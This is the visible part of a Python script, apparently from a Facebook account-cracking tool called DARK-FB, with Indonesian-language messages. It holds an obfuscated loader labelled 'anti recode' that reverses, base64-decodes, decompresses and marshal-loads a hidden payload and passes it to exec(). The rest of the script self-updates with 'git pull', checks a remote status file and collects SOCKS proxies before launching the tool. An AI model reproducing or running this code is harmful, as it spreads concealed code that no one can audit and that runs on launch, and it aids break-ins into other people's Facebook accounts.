0OV4jW4kQVIuehZvEI3ShutdNmWNe90mNlwEiIhjX2uJx1Mz1uR6Ze5pXl778Hu5t9mPAgijUhJwkbgn3cevwxetB+xDvYvhwQt1WH9aC3vwZxoxHbH0K22XEO6broksIY/4vunkWLJb3xQtGQGMFgFO5Oi0t0GK55hlNGwMyhV/To4MHzHTlMzK/+eC9vclcIkTQndYl3bmsPFDFieQhmU0PlM+JdSuv9Xa7o6G+sTXPB53DQa/sZatSyOSWnMbw3iMnNCJqovInJPYwLywyyL1fZTbAlgobRm2H2NfwILVaXwZFIIwd3hemQtaI22rGECEd8WjjvoVuYQMk+GhRF+ljLRzUg0i/8e8YJErbfTYVFikLfX8RHMZ0/U8kvL2h9lncqovVli6Y+7+RAzRcoMJwyy/mEjo2dU9cIDfnlvXBQMyUMiaAogRjHwXwtAelxxoTytderGl5rubS5yqIxdzNNz+XQSZLvwpf0gg0z9dCFAQBirdOlu3SWKau7M/RT5UPwFE6D67tqj3OQPU+ZQG6zISxjUfFdB2ehnWZ5Unrf7zNkpbmenhTDK3BtJ1POVh27XnzNu2aVoEbSyd5v40oNS32OYVkcJHSwTpPj1gqxbv/TSBRkXZtYkOb4V/+TM3tlFMTB68oI/ZN0wqAgBde7h4kPRtFlidv89avr0yPsn2QCXYvfGP9VQ9wyiLC4XO7h53n3lvzC9VHCXdjKAEwz6fLjA7F+bNvD/AaWjCwE7la1z7uKiyZB37c5bcL82JA75LRRC/ypt+8pTaveL8BdzTrF2FmBGsmoBeiF5VawnGCGrO+dTx6WKNk2pFLq0RqPpCh4jxgMPGmzuxCNbHSFGwBE1ZgcLslUF2g2MakMa/OlUcJFm7UF8cchdcRXfyDmV8R1izv94TMImPT/YEAC2uhKfbS8ZZdG4L/qylkF4dgeTJ1jpADziltE3ipTKA6Y7xeMv4OE44+NlQLenyitKOoeHdQQovQS8IaOQZzZp00isszDb9j08AObPIdKs3g6BgHQ0KGZngBjuhcL6/hjnC7j8qTyV4MnNT+cUNqVujoShp54RAxsomKwtXesevOIeRcz9/NRZpCr+YJpTVSLGfNqIrbyTiqo/I9BIEZZkv+LRagowODJhJBvNOjjYc1GuwBTCfAVUZS8UO1wKB9cmAvRvqP5IwwLfN3TDUka9h7dpfdKBi0N+KNYZrrNFixGBBoJQuVpCd8l0i+0T+ebeqevKxBFR2PGOrCmb/CCLbzpn+jXmcyalGdZgnT+UnHz8604ThVNcFyNJT9wClRoUVBhhWQKJGbZy4eTyhmU0IkkVndZG/FXKQyD28xGoiyleSsWSi+x7GFz7ugSUbK1JPOGsAXqJqlAtXFBo75u0LCQWu3f9WVEPUQOoO/padTh9FkdqJbRoB5wn3vS5LG3AcZ/AkxlknA4ES1LfNJN+Rq3Xeu2uD6NETUymaEhqeVwp4WEKjJut46j6C6/k7FwOzEaDhTbRfkZ7F3uuTuDV6qdkHLP+pdK5nA9A0QlWR+EvkAJc5pgIszKL8JzBBgBhECHozCSJdV1iR/IPWSRpvEiiAxHv3HtnKQzgzhadaRjrIghk4vioBqTgQNjgAItVKBikYBiAoyh9NTjUdAiggXwgIQiWIgjnNZk2es1/rG/Wv1P//Ln/p0/ffde//9584vK/nmvU8/72Xc//Xku/19/n5PtPrqqBSCqqBm6kIYuip82SoVtqd9+QPDUi31L65xAJAeHowwTboClJf+n5ypc9OcDedxJe'))
#Bot Auto Check File Anti Rikod
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'vd3JYDA/a8/36/GzPUyIwPf7d3FO95q47nu/rzJGw9y1Y6Z2tQiuwZ28QsWY2pocbqeeUbW6od2jym2Eei8I40eKUC08KIm9Olf7KnGLsYSljFX1R8AOX2mvCnmC1VscQjs0WoOAjuVHj+mUWFMISdaS6of1vmIyu60FkLn6m2Eqh7VBnvUwEJ2/g5oPHPeVyf0atVzOCGSO1O52Jswhd82B2HsvF+B75WZljhLLfOmpEgvrr0wsarZprypz62cXGF+2D03jwG6s3w7ilibs0Y/tVBUkp5DTI22diGrtjgrWacQBbcObTKFDVP+5voVPVZBmcXvXhFNRnWkhpigHRevPW00orolT6cthr4L5iZFPy2qrzxNAyowg3QwshEghPlpPIwEIIM76qe2jzs4t43ivfVcvq/bpRXZxcUKeTb9wMQAMBaDNkELsRLTGSgBYpoWVnMGSEgFsXXqwovZRAA0gSlEkdxJe'))

class Main_:
	def __init__(self):
		msin=""
	def __check_update_(self, version_):
		try:
			version = requests.get("https://raw.githubusercontent.com/Dumai-991/DARK-FB/Xnxx/data/version.txt").text.strip()
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
		if version == version_:
			os.system('git pull')
			os.system('clear')
		else:
			os.system('git pull;clear')
			kocol = ""
			kocol += QQ+"Version Script Ini ("+OO+version_+QQ+") Akan Diupdate Menjadi ("+OO+version+QQ+")\n\n"
			kocol += ("Tunggu Sebentar Sedang Update Script.....\n")
			kocol += ("Jika Masih Stuck Update/Gini Terus Silahkan Gunakan Pernintah Ini \n")
			kocol += ("python update.py\n")
			iprint(Panel(kocol, style=M))
			kotak("# COBA KETIK : python main.py SEKALI LAGI!!",M,Q)
			os.sys.exit()
	def __check_status_(self, mainx):
		try:
			mainz = requests.get("https://raw.githubusercontent.com/Dumai-991/DARK-FB/Xnxx/data/status.txt").text.strip()
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
		if mainx == mainz:
			global yyy
			yyy = ""
		else:
			kotak("# MAAF SEVER DARK-FB SEDANG MAINTENANCE, KAMI AKAN KEMBALI :D",C,K)
			os.system('git pull')
			os.sys.exit()
	def _no_vpn(self):
#		try:
		folder();open_role()
		self.__check_update_("2.2")
		self.__check_status_("aktif")
		get_proxy_socks4()
		get_proxy_socks5()
		Main()
#		except:console.print_exception(show_locals=None,word_wrap=None,max_frames=100,extra_lines=0)

Main_()._no_vpn()
